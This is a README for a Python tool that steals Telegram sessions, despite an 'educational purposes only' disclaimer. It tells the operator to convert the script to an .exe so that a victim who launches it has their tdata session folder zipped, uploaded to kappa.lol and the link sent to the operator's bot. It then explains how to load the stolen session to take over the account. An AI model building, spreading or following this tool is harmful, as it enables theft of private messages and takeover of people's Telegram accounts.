# Telegram stealer
Simple Telegram session stealer. Made with Python.  
All code is made for **educational purposes only**.   
Author does not support and condemns illegal actions with confidential data of any people.
Be kind and respect each other.

# Usage
Only lib needed for script working is [requests](https://pypi.org/project/requests/).  
Basically you need to convert this code into .exe file, for this I highly recommend [autopytoexe](https://pypi.org/project/auto-py-to-exe/).

When somebody launch program, code zipping **tdata folder** and sending it to [kappa.lol](https://kappa.lol/) with API request, after this complete download link is going to your Telegram chat with your Bot (you need to create it yourself to get HTTP token)

Thanks to the [kappa.lol](https://kappa.lol/) website and for their awesome API, also you can check kappa [source code](https://github.com/0Supa/uploader), such awesome project.

# Notes
* Script saving only needed folders and cutting off folders that don't contain user session files;
* After downloading .zip file from kappa you need to put it into folder and name it tdata, next step is dropping tdata folder somewhere with Telegram.exe file and start it;
* Make sure that your Telegram.exe file is updated.

# Preview
![](https://github.com/qwerzxcqwe/telegramstealer/blob/main/preview.gif)
